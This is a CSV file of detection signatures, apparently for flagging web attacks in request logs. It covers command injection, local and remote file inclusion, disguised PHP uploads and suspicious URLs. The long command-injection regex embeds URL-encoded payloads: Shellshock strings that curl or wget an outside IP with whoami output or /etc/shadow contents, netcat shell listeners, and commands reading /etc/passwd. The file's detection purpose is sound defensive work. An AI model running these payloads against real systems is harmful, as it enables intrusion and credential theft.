attack_name,attack_query
[COMMAND INJECTION] Common UNIX Payloads,(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B)|(%2Findex.html%7Cid%7C)|(%28%29\+%7B\+%3A%3B%7D%3B\+%2Fbin%2Fbash\+-c)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%26quot%3B--%26gt%3B%0A)(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fshadow%26quot%3B--%26gt%3B%0A)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fbin%2Fcat%2520%2Fetc%2Fshadow%26quot%3B--%26gt%3B%0A)(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)|(%26lt%3B%21--%23exec%2520cmd%3D%26quot%3B%2Fusr%2Fbin%2Fid%3B--%26gt%3B%0A)(%2Findex.html%7Cid%7C%0A)|(%2Findex.html%7Cid%7C%0A)(%3Bid%3B%0A)|(%3Bid%3B%0A)(%3Bid%0A)|(%3Bid%0A)(%3Bnetstat+-a%3B%0A)|(%3Bnetstat+-a%3B%0A)(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)|(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)(%3Bid%3B%0A)|(%3Bid%3B%0A)(%7Cid%0A)|(%7Cid%0A)(%7C%2Fusr%2Fbin%2Fid%0A)|(%7C%2Fusr%2Fbin%2Fid%0A)(%7Cid%7C%0A)|(%7Cid%7C%0A)(%7C%2Fusr%2Fbin%2Fid%7C%0A)|(%7C%2Fusr%2Fbin%2Fid%7C%0A)(%7C%7C%2Fusr%2Fbin%2Fid%7C%0A)|(%7C%7C%2Fusr%2Fbin%2Fid%7C%0A)(%7Cid%3B%0A)|(%7Cid%3B%0A)(%7C%7C%2Fusr%2Fbin%2Fid%3B%0A)|(%7C%7C%2Fusr%2Fbin%2Fid%3B%0A)(%3Bid%7C%0A)|(%3Bid%7C%0A)(%3B%7C%2Fusr%2Fbin%2Fid%7C%0A)|(%3B%7C%2Fusr%2Fbin%2Fid%7C%0A)(%5Cn%2Fbin%2Fls+-al%5Cn%0A)|(%5Cn%2Fbin%2Fls+-al%5Cn%0A)(%5Cn%2Fusr%2Fbin%2Fid%5Cn%0A)|(%5Cn%2Fusr%2Fbin%2Fid%5Cn%0A)(%5Cnid%5Cn%0A)|(%5Cnid%5Cn%0A)(%5Cn%2Fusr%2Fbin%2Fid%3B%0A)|(%5Cn%2Fusr%2Fbin%2Fid%3B%0A)(%5Cnid%3B%0A)|(%5Cnid%3B%0A)(%5Cn%2Fusr%2Fbin%2Fid%7C%0A)|(%5Cn%2Fusr%2Fbin%2Fid%7C%0A)(%5Cnid%7C%0A)|(%5Cnid%7C%0A)(%3B%2Fusr%2Fbin%2Fid%5Cn%0A)|(%3B%2Fusr%2Fbin%2Fid%5Cn%0A)(%3Bid%5Cn%0A)|(%3Bid%5Cn%0A)(%7Cusr%2Fbin%2Fid%5Cn%0A)|(%7Cusr%2Fbin%2Fid%5Cn%0A)(%7Cnid%5Cn%0A)|(%7Cnid%5Cn%0A)(%60id%60%0A)|(%60id%60%0A)(%60%2Fusr%2Fbin%2Fid%60%0A)|(%60%2Fusr%2Fbin%2Fid%60%0A)(a%29%3Bid%0A)|(a%29%3Bid%0A)(a%3Bid%0A)|(a%3Bid%0A)(a%29%3Bid%3B%0A)|(a%29%3Bid%3B%0A)(a%3Bid%3B%0A)|(a%3Bid%3B%0A)(a%29%3Bid%7C%0A)|(a%29%3Bid%7C%0A)(a%3Bid%7C%0A)|(a%3Bid%7C%0A)(a%29%7Cid%0A)|(a%29%7Cid%0A)(a%7Cid%0A)|(a%7Cid%0A)(a%29%7Cid%3B%0A)|(a%29%7Cid%3B%0A)(a%7Cid%0A)|(a%7Cid%0A)(%7C%2Fbin%2Fls+-al%0A)|(%7C%2Fbin%2Fls+-al%0A)(a%29%3B%2Fusr%2Fbin%2Fid%0A)|(a%29%3B%2Fusr%2Fbin%2Fid%0A)(a%3B%2Fusr%2Fbin%2Fid%0A)|(a%3B%2Fusr%2Fbin%2Fid%0A)(a%29%3B%2Fusr%2Fbin%2Fid%3B%0A)|(a%29%3B%2Fusr%2Fbin%2Fid%3B%0A)(a%3B%2Fusr%2Fbin%2Fid%3B%0A)|(a%3B%2Fusr%2Fbin%2Fid%3B%0A)(a%29%3B%2Fusr%2Fbin%2Fid%7C%0A)|(a%29%3B%2Fusr%2Fbin%2Fid%7C%0A)(a%3B%2Fusr%2Fbin%2Fid%7C%0A)|(a%3B%2Fusr%2Fbin%2Fid%7C%0A)(a%29%7C%2Fusr%2Fbin%2Fid%0A)|(a%29%7C%2Fusr%2Fbin%2Fid%0A)(a%7C%2Fusr%2Fbin%2Fid%0A)|(a%7C%2Fusr%2Fbin%2Fid%0A)(a%29%7C%2Fusr%2Fbin%2Fid%3B%0A)|(a%29%7C%2Fusr%2Fbin%2Fid%3B%0A)(a%7C%2Fusr%2Fbin%2Fid%0A)|(a%7C%2Fusr%2Fbin%2Fid%0A)(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)|(%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29%0A)(%3Bsystem%28%27id%27%29%0A)|(%3Bsystem%28%27id%27%29%0A)(%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29%0A)|(%3Bsystem%28%27%2Fusr%2Fbin%2Fid%27%29%0A)(%250Acat%2520%2Fetc%2Fpasswd%0A)|(%250Acat%2520%2Fetc%2Fpasswd%0A)(%250A%2Fusr%2Fbin%2Fid%0A)|(%250A%2Fusr%2Fbin%2Fid%0A)(%250Aid%0A)|(%250Aid%0A)(%250A%2Fusr%2Fbin%2Fid%250A%0A)|(%250A%2Fusr%2Fbin%2Fid%250A%0A)(%250Aid%250A%0A)|(%250Aid%250A%0A)(%26+ping+-i+30+127.0.0.1+%26%0A)|(%26+ping+-i+30+127.0.0.1+%26%0A)(%26+ping+-n+30+127.0.0.1+%26%0A)|(%26+ping+-n+30+127.0.0.1+%26%0A)(%250a+ping+-i+30+127.0.0.1+%250a%0A)|(%250a+ping+-i+30+127.0.0.1+%250a%0A)(%60ping+127.0.0.1%60%0A)|(%60ping+127.0.0.1%60%0A)(%7C+id%0A)|(%7C+id%0A)(%26+id%0A)|(%26+id%0A)(%3B+id%0A)|(%3B+id%0A)(%250a+id+%250a%0A)|(%250a+id+%250a%0A)(%60id%60%0A)|(%60id%60%0A)(%24%3B%2Fusr%2Fbin%2Fid%0A)|(%24%3B%2Fusr%2Fbin%2Fid%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D16%3Fuser%3D%5C%60whoami%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D16%3Fuser%3D%5C%60whoami%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D18%3Fpwd%3D%5C%60pwd%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D18%3Fpwd%3D%5C%60pwd%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D20%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D20%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D22%3Funame%3D%5C%60uname+-a%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D22%3Funame%3D%5C%60uname+-a%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D24%3Fshell%3D%5C%60nc+-lvvp+1234+-e+%2Fbin%2Fbash%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D24%3Fshell%3D%5C%60nc+-lvvp+1234+-e+%2Fbin%2Fbash%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D26%3Fshell%3D%5C%60nc+-lvvp+1236+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D26%3Fshell%3D%5C%60nc+-lvvp+1236+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D5%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D5%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D1%26%3Fvuln%3D6%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D1%26%3Fvuln%3D6%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+echo+vulnerable+1%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+1+%26%26+echo+vulnerable+1%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D3%26%3Fvuln%3D7%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D3%26%3Fvuln%3D7%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+echo+vulnerable+3%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+3+%26%26+echo+vulnerable+3%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D6%26%3Fvuln%3D8%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D6%26%3Fvuln%3D8%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D9%26%3Fvuln%3D9%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+curl+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fsleep%3D9%26%3Fvuln%3D9%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+echo+vulnerable+6%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22sleep+6+%26%26+echo+vulnerable+6%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D17%3Fuser%3D%5C%60whoami%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D17%3Fuser%3D%5C%60whoami%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D19%3Fpwd%3D%5C%60pwd%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D19%3Fpwd%3D%5C%60pwd%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D21%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D21%3Fshadow%3D%5C%60grep+root+%2Fetc%2Fshadow%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D23%3Funame%3D%5C%60uname+-a%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D23%3Funame%3D%5C%60uname+-a%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D25%3Fshell%3D%5C%60nc+-lvvp+1235+-e+%2Fbin%2Fbash%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D25%3Fshell%3D%5C%60nc+-lvvp+1235+-e+%2Fbin%2Fbash%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D27%3Fshell%3D%5C%60nc+-lvvp+1237+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D27%3Fshell%3D%5C%60nc+-lvvp+1237+-e+%2Fbin%2Fbash+%26%5C%60%22%0A)(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D4%22%0A)|(%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fbash+-c+%22wget+http%3A%2F%2F135.23.158.130%2F.testing%2Fshellshock.txt%3Fvuln%3D4%22%0A)(cat+%2Fetc%2Fhosts%0A)|(cat+%2Fetc%2Fhosts%0A)(%24%28%60cat+%2Fetc%2Fpasswd%60%29%0A)|(%24%28%60cat+%2Fetc%2Fpasswd%60%29%0A)(cat+%2Fetc%2Fpasswd%0A)|(cat+%2Fetc%2Fpasswd%0A)(%250Acat%2520%2Fetc%2Fpasswd%0A)|(%250Acat%2520%2Fetc%2Fpasswd%0A)(%7B%7B+get_user_file%28%22%2Fetc%2Fpasswd%22%29+%7D%7D%0A)|(%7B%7B+get_user_file%28%22%2Fetc%2Fpasswd%22%29+%7D%7D%0A)(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E%0A)|(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fpasswd%22--%3E%0A)(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E%0A)|(%3C%21--%23exec+cmd%3D%22%2Fbin%2Fcat+%2Fetc%2Fshadow%22--%3E%0A)(%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E%0A)|(%3C%21--%23exec+cmd%3D%22%2Fusr%2Fbin%2Fid%3B--%3E%0A)(system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%0A)|(system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%0A)(%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E)|(%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E)
[LOCAL FILE INCLUSION] Possible Directory Traversal,\.\.\/|\/etc\/passwd|file:\/\/|=\/
[LOCAL FILE INCLUSION] Arbitrary Code Execution,\(\$\_GET\[\'cmd\'\]\)\;\?\>|input\&cmd|filter\/resource|cmd=
[LOCAL FILE INCLUSION] Possible Arbitrary Code Execution Encoded in Base64,base64_decode
[LOCAL FILE INCLUSION] PHP Code Execution Commands detected,shell_exec|passthru\(
[FILE UPLOAD] Masking PHP file with .jpg,\.php\.jpg
[REMOTE FILE INCLUSION] Possible Loading of URL into web-server,page=http|page=www|page=HTTP|page=WWW
[URL INDICATOR] Public IP address input detected possible malicious link,\b(?!(?:10\.|172\.(?:1[6-9]|2[0-9]|3[0-2])\.|192\.168\.))((?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])))\b
[URL INDICATOR] URL input detected possible malicious link,"https?((:\/\/)|%3A%2F%2F)(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,4}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)"
